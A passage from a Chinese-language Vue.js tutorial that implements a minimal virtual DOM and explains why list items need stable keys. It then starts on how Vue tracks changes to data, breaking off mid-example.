<span class="kd">function</span> <span class="nx">el</span><span class="p">(</span><span class="nx">tagName</span><span class="p">,</span> <span class="nx">props</span><span class="p">,</span> <span class="nx">children</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">Element</span><span class="p">(</span><span class="nx">tagName</span><span class="p">,</span> <span class="nx">props</span><span class="p">,</span> <span class="nx">children</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div><p>构建虚拟的 <code class="language-plaintext highlighter-rouge">DOM</code> ，用 javascript 对象来表示</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">ul</span> <span class="o">=</span> <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">div</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Virtual DOM</span><span class="dl">'</span> <span class="p">},</span> <span class="p">[</span>
    <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">,</span> <span class="p">{},</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Virtual DOM</span><span class="dl">'</span><span class="p">]),</span>
    <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">ul</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">list</span><span class="dl">'</span> <span class="p">},</span> <span class="p">[</span>
        <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">li</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">class</span><span class="p">:</span> <span class="dl">'</span><span class="s1">item</span><span class="dl">'</span> <span class="p">},</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Item 1</span><span class="dl">'</span><span class="p">]),</span>
        <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">li</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">class</span><span class="p">:</span> <span class="dl">'</span><span class="s1">item</span><span class="dl">'</span> <span class="p">},</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Item 2</span><span class="dl">'</span><span class="p">]),</span>
        <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">li</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">class</span><span class="p">:</span> <span class="dl">'</span><span class="s1">item</span><span class="dl">'</span> <span class="p">},</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Item 3</span><span class="dl">'</span><span class="p">])</span>
    <span class="p">]),</span>
    <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">div</span><span class="dl">'</span><span class="p">,</span> <span class="p">{},</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Hello, World</span><span class="dl">'</span><span class="p">])</span>
<span class="p">])</span>
</code></pre></div></div><p>现在 <code class="language-plaintext highlighter-rouge">ul</code> 就是我们用 <code class="language-plaintext highlighter-rouge">JavaScript</code> 对象表示的 <code class="language-plaintext highlighter-rouge">DOM</code> 结构，我们输出查看 <code class="language-plaintext highlighter-rouge">ul</code> 对应的数据结构如下：</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220323130142449.png" alt="image-20220323130142449" /></p><p><strong>（2）</strong>将用 js 对象表示的虚拟 DOM 转换成真实 DOM：需要用到 js 原生操作 DOM 的方法。</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
 * render 将virdual-dom 对象渲染为实际 DOM 元素
 */</span>
<span class="nx">Element</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="c1">// 创建节点</span>
    <span class="kd">let</span> <span class="nx">el</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">tagName</span><span class="p">);</span>

    <span class="kd">let</span> <span class="nx">props</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">;</span>
    <span class="c1">// 设置节点的 DOM 属性</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">propName</span> <span class="k">in</span> <span class="nx">props</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">propValue</span> <span class="o">=</span> <span class="nx">props</span><span class="p">[</span><span class="nx">propName</span><span class="p">];</span>
        <span class="nx">el</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="nx">propName</span><span class="p">,</span> <span class="nx">propValue</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">children</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">children</span> <span class="o">||</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">child</span> <span class="k">of</span> <span class="nx">children</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">childEl</span> <span class="o">=</span> <span class="p">(</span><span class="nx">child</span> <span class="k">instanceof</span> <span class="nx">Element</span><span class="p">)</span>
        <span class="p">?</span> <span class="nx">child</span><span class="p">.</span><span class="nx">render</span><span class="p">()</span> <span class="c1">// 如果子节点也是虚拟 DOM, 递归构建 DOM 节点</span>
        <span class="p">:</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createTextNode</span><span class="p">(</span><span class="nx">child</span><span class="p">)</span> <span class="c1">// 如果是文本，就构建文本节点</span>

        <span class="nx">el</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">childEl</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nx">el</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div><p>我们通过查看以上 <code class="language-plaintext highlighter-rouge">render</code> 方法，会根据 <code class="language-plaintext highlighter-rouge">tagName</code> 构建一个真正的 <code class="language-plaintext highlighter-rouge">DOM</code> 节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。</p><p>我们将构建好的 <code class="language-plaintext highlighter-rouge">DOM</code> 结构添加到页面 <code class="language-plaintext highlighter-rouge">body</code> 上面，如下：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">ulRoot</span> <span class="o">=</span> <span class="nx">ul</span><span class="p">.</span><span class="nx">render</span><span class="p">();</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">ulRoot</span><span class="p">);</span>
</code></pre></div></div><p>这样，页面 <code class="language-plaintext highlighter-rouge">body</code> 里面就有真正的 <code class="language-plaintext highlighter-rouge">DOM</code> 结构，效果如下图所示：</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220323130544065.png" alt="image-20220323130544065" /></p><blockquote><p>我们知道虚拟 DOM 的好处和虚拟 DOM 的实现后就要讲讲 key 的作用了。</p><p>贴一下上面实现地完整代码</p></blockquote><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
    <span class="cm">/**
         * Element virdual-dom 对象定义
         * @param {String} tagName - dom 元素名称
         * @param {Object} props - dom 属性
         * @param {Array&lt;Element|String&gt;} - 子节点
         */</span>
    <span class="kd">function</span> <span class="nx">Element</span><span class="p">(</span><span class="nx">tagName</span><span class="p">,</span> <span class="nx">props</span><span class="p">,</span> <span class="nx">children</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">=</span> <span class="nx">tagName</span><span class="p">;</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">props</span> <span class="o">=</span> <span class="nx">props</span><span class="p">;</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">children</span> <span class="o">=</span> <span class="nx">children</span><span class="p">;</span>
        <span class="c1">// dom 元素的 key 值，用作唯一标识符</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">props</span><span class="p">.</span><span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="nx">key</span> <span class="o">=</span> <span class="nx">props</span><span class="p">.</span><span class="nx">key</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nx">el</span><span class="p">(</span><span class="nx">tagName</span><span class="p">,</span> <span class="nx">props</span><span class="p">,</span> <span class="nx">children</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nx">Element</span><span class="p">(</span><span class="nx">tagName</span><span class="p">,</span> <span class="nx">props</span><span class="p">,</span> <span class="nx">children</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">ul</span> <span class="o">=</span> <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">div</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Virtual DOM</span><span class="dl">'</span> <span class="p">},</span> <span class="p">[</span>
        <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">,</span> <span class="p">{},</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Virtual DOM</span><span class="dl">'</span><span class="p">]),</span>
        <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">ul</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">list</span><span class="dl">'</span> <span class="p">},</span> <span class="p">[</span>
            <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">li</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">class</span><span class="p">:</span> <span class="dl">'</span><span class="s1">item</span><span class="dl">'</span> <span class="p">},</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Item 1</span><span class="dl">'</span><span class="p">]),</span>
            <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">li</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">class</span><span class="p">:</span> <span class="dl">'</span><span class="s1">item</span><span class="dl">'</span> <span class="p">},</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Item 2</span><span class="dl">'</span><span class="p">]),</span>
            <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">li</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">class</span><span class="p">:</span> <span class="dl">'</span><span class="s1">item</span><span class="dl">'</span> <span class="p">},</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Item 3</span><span class="dl">'</span><span class="p">])</span>
        <span class="p">]),</span>
        <span class="nx">el</span><span class="p">(</span><span class="dl">'</span><span class="s1">div</span><span class="dl">'</span><span class="p">,</span> <span class="p">{},</span> <span class="p">[</span><span class="dl">'</span><span class="s1">Hello, World</span><span class="dl">'</span><span class="p">])</span>
    <span class="p">])</span>

    <span class="cm">/**
             * render 将virdual-dom 对象渲染为实际 DOM 元素
             */</span>
    <span class="nx">Element</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="c1">// 创建节点</span>
        <span class="kd">let</span> <span class="nx">el</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">tagName</span><span class="p">);</span>

        <span class="kd">let</span> <span class="nx">props</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">;</span>
        <span class="c1">// 设置节点的 DOM 属性</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">propName</span> <span class="k">in</span> <span class="nx">props</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">let</span> <span class="nx">propValue</span> <span class="o">=</span> <span class="nx">props</span><span class="p">[</span><span class="nx">propName</span><span class="p">];</span>
            <span class="nx">el</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="nx">propName</span><span class="p">,</span> <span class="nx">propValue</span><span class="p">)</span>
        <span class="p">}</span>

        <span class="kd">let</span> <span class="nx">children</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">children</span> <span class="o">||</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">child</span> <span class="k">of</span> <span class="nx">children</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">let</span> <span class="nx">childEl</span> <span class="o">=</span> <span class="p">(</span><span class="nx">child</span> <span class="k">instanceof</span> <span class="nx">Element</span><span class="p">)</span>
            <span class="p">?</span> <span class="nx">child</span><span class="p">.</span><span class="nx">render</span><span class="p">()</span> <span class="c1">// 如果子节点也是虚拟 DOM, 递归构建 DOM 节点</span>
            <span class="p">:</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createTextNode</span><span class="p">(</span><span class="nx">child</span><span class="p">)</span> <span class="c1">// 如果是文本，就构建文本节点</span>

            <span class="nx">el</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">childEl</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nx">el</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">ulRoot</span> <span class="o">=</span> <span class="nx">ul</span><span class="p">.</span><span class="nx">render</span><span class="p">();</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">ulRoot</span><span class="p">);</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">ul</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div><h4 id="虚拟dom中key的作用"><strong>虚拟DOM中key的作用</strong></h4><p>key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：</p><ul><li>旧虚拟DOM中找到了与新虚拟DOM相同的key：<ul><li>①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！</li><li>②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。</li></ul></li><li>旧虚拟DOM中未找到与新虚拟DOM相同的key<ul><li>创建新的真实DOM，随后渲染到到页面。</li></ul></li></ul><blockquote><p>好了，我们知道了最简单的key的原理，如果要继续研究下去就要涉及到vue的核心之一-Diff算法，后面会详细介绍。</p></blockquote><h3 id="用index作为key可能会引发的问题">用index作为key可能会引发的问题：</h3><p><strong>若对数据进行：逆序添加、逆序删除等破坏顺序操作：</strong></p><p>会产生没有必要的真实DOM更新 ==&gt; 界面效果没问题, 但效率低。</p><blockquote><p>案例</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- 遍历数组 --&gt;</span>
    <span class="nt">&lt;h2&gt;</span>人员列表（遍历数组）<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click.once=</span><span class="s">"add"</span><span class="nt">&gt;</span>添加一个老刘<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li</span> <span class="na">v-for=</span><span class="s">"(p,index) of persons"</span> <span class="na">:key=</span><span class="s">"index"</span><span class="nt">&gt;</span>
            -
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
	<span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>

	<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
		<span class="na">el</span><span class="p">:</span> <span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">data</span><span class="p">:</span> <span class="p">{</span>
			<span class="na">persons</span><span class="p">:</span> <span class="p">[</span>
				<span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">001</span><span class="dl">'</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span> <span class="na">age</span><span class="p">:</span> <span class="mi">18</span> <span class="p">},</span>
				<span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">002</span><span class="dl">'</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">李四</span><span class="dl">'</span><span class="p">,</span> <span class="na">age</span><span class="p">:</span> <span class="mi">19</span> <span class="p">},</span>
				<span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">003</span><span class="dl">'</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">王五</span><span class="dl">'</span><span class="p">,</span> <span class="na">age</span><span class="p">:</span> <span class="mi">20</span> <span class="p">}</span>
			<span class="p">]</span>
		<span class="p">},</span>
		<span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
			<span class="nx">add</span><span class="p">()</span> <span class="p">{</span>
				<span class="kd">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">004</span><span class="dl">'</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">老刘</span><span class="dl">'</span><span class="p">,</span> <span class="na">age</span><span class="p">:</span> <span class="mi">40</span> <span class="p">}</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">persons</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span>
			<span class="p">}</span>
		<span class="p">},</span>
	<span class="p">});</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><blockquote><p>解释：</p></blockquote><p>初始数据</p><p>persons: [ { id: ‘001’, name: ‘张三’, age: 18 }, { id: ‘002’, name: ‘李四’, age: 19 }, { id: ‘003’, name: ‘王五’, age: 20 } ]</p><p><strong>vue根据数据生成虚拟 DOM</strong></p><p>初始虚拟 DOM</p><div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;li</span> <span class="na">key=</span><span class="s">'0'</span><span class="nt">&gt;</span>张三-18<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;&lt;/li&gt;</span>
<span class="nt">&lt;li</span> <span class="na">key=</span><span class="s">'1'</span><span class="nt">&gt;</span>李四-19<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;&lt;/li&gt;</span>
<span class="nt">&lt;li</span> <span class="na">key=</span><span class="s">'2'</span><span class="nt">&gt;</span>王五-20<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;&lt;/li&gt;</span>
</code></pre></div></div><p><strong>将虚拟 DOM 转为 真实 DOM</strong></p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326153628779.png" alt="image-20220326153628779" /></p><p><code class="language-plaintext highlighter-rouge">this.persons.unshift({ id: '004', name: '老刘', age: 40 })</code></p><p>在 persons 数组最前面添加上 { id: ‘004’, name: ‘老刘’, age: 40 }</p><p>新数据：</p><p>persons: [</p><p>​ { id: ‘004’, name: ‘老刘’, age: 40 },</p><p>​ { id: ‘001’, name: ‘张三’, age: 18 }, ​ { id: ‘002’, name: ‘李四’, age: 19 }, ​ { id: ‘003’, name: ‘王五’, age: 20 } ]</p><p><strong>vue根据数据生成虚拟 DOM</strong></p><p>新虚拟 DOM</p><div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;li</span> <span class="na">key=</span><span class="s">'0'</span><span class="nt">&gt;</span>老刘-30<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;&lt;/li&gt;</span>
<span class="nt">&lt;li</span> <span class="na">key=</span><span class="s">'1'</span><span class="nt">&gt;</span>张三-18<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;&lt;/li&gt;</span>
<span class="nt">&lt;li</span> <span class="na">key=</span><span class="s">'3'</span><span class="nt">&gt;</span>李四-19<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;&lt;/li&gt;</span>
<span class="nt">&lt;li</span> <span class="na">key=</span><span class="s">'4'</span><span class="nt">&gt;</span>王五-20<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;&lt;/li&gt;</span>
</code></pre></div></div><p><strong>将虚拟 DOM 转为 真实 DOM</strong></p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326154022144.png" alt="image-20220326154022144" /></p><p>因为老刘被插到第一个，重刷了 key 的值，vue Diff 算法 根据 key 的值 判断 虚拟DOM 全部发生了改变，然后全部重新生成新的 真实 DOM。实际上，张三，李四，王五并没有发生更改，是可以直接复用之前的真实 DOM，而因为 key 的错乱，导致要全部重新生成，造成了性能的浪费。</p><blockquote><p>来张尚硅谷的图</p></blockquote><p><img src="C:\Users\28318\Desktop\vue\vue_basic\12_列表渲染\key的原理2.png" alt="key的原理2" /></p><p><strong>如果结构中还包含输入类的DOM：</strong></p><p>会产生错误DOM更新 ==&gt; 界面有问题。</p><blockquote><p>这回造成的就不是性能浪费了，会直接导致页面的错误</p></blockquote><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326154707588.png" alt="image-20220326154707588" /></p><h3 id="结论">结论：</h3><ul><li>最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值</li><li>如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的</li></ul><blockquote><p>来张尚硅谷的图，正经使用 key</p></blockquote><p><img src="C:\Users\28318\Desktop\vue\vue_basic\12_列表渲染\key的原理1.png" alt="key的原理1" /></p><h2 id="114-vue-监测data-中的-数据">1.14 vue 监测data 中的 数据</h2><p>先来个案例引入一下：</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>人员列表<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"updateMei"</span><span class="nt">&gt;</span>更新马冬梅的信息<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li</span> <span class="na">v-for=</span><span class="s">"(p,index) of persons"</span> <span class="na">:key=</span><span class="s">"p.id"</span><span class="nt">&gt;</span>
            --
        <span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span> 
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>

    <span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">persons</span><span class="p">:[</span>
                <span class="p">{</span><span class="na">id</span><span class="p">:</span><span class="dl">'</span><span class="s1">001</span><span class="dl">'</span><span class="p">,</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">马冬梅</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">30</span><span class="p">,</span><span class="na">sex</span><span class="p">:</span><span class="dl">'</span><span class="s1">女</span><span class="dl">'</span><span class="p">},</span>
                <span class="p">{</span><span class="na">id</span><span class="p">:</span><span class="dl">'</span><span class="s1">002</span><span class="dl">'</span><span class="p">,</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">周冬雨</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">31</span><span class="p">,</span><span class="na">sex</span><span class="p">:</span><span class="dl">'</span><span class="s1">女</span><span class="dl">'</span><span class="p">},</span>
                <span class="p">{</span><span class="na">id</span><span class="p">:</span><span class="dl">'</span><span class="s1">003</span><span class="dl">'</span><span class="p">,</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">周杰伦</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">18</span><span class="p">,</span><span class="na">sex</span><span class="p">:</span><span class="dl">'</span><span class="s1">男</span><span class="dl">'</span><span class="p">},</span>
                <span class="p">{</span><span class="na">id</span><span class="p">:</span><span class="dl">'</span><span class="s1">004</span><span class="dl">'</span><span class="p">,</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">温兆伦</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">19</span><span class="p">,</span><span class="na">sex</span><span class="p">:</span><span class="dl">'</span><span class="s1">男</span><span class="dl">'</span><span class="p">}</span>
            <span class="p">]</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">updateMei</span><span class="p">(){</span>
                <span class="c1">// this.persons[0].name = '马老师' //奏效</span>
                <span class="c1">// this.persons[0].age = 50 //奏效</span>
                <span class="c1">// this.persons[0].sex = '男' //奏效</span>
                <span class="k">this</span><span class="p">.</span><span class="nx">persons</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="na">id</span><span class="p">:</span><span class="dl">'</span><span class="s1">001</span><span class="dl">'</span><span class="p">,</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">马老师</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">50</span><span class="p">,</span><span class="na">sex</span><span class="p">:</span><span class="dl">'</span><span class="s1">男</span><span class="dl">'</span><span class="p">}</span> <span class="c1">//不奏效</span>
                <span class="c1">// this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span> 

<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p>点击更新马冬梅的信息，马冬梅的数据并没有发生改变。</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326163110778.png" alt="image-20220326163110778" /></p><p>我们来看看控制台：</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326163230301.png" alt="image-20220326163230301" /></p><p>控制台上的数据发生了改变，说明，这个更改的数据并没有被 vue 监测到。</p><p>所以我们来研究一下 Vue 监测的原理。</p><p>我们先研究 Vue 如何监测 对象里的数据</p><blockquote><p>代码</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>学校名称：<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;h2&gt;</span>学校地址：<span class="nt">&lt;/h2&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>

    <span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">浙江师范大学</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">address</span><span class="p">:</span><span class="dl">'</span><span class="s1">金华</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">student</span><span class="p">:{</span>
                <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">tom</span><span class="dl">'</span><span class="p">,</span>
                <span class="na">age</span><span class="p">:{</span>
                    <span class="na">rAge</span><span class="p">:</span><span class="mi">40</span><span class="p">,</span>
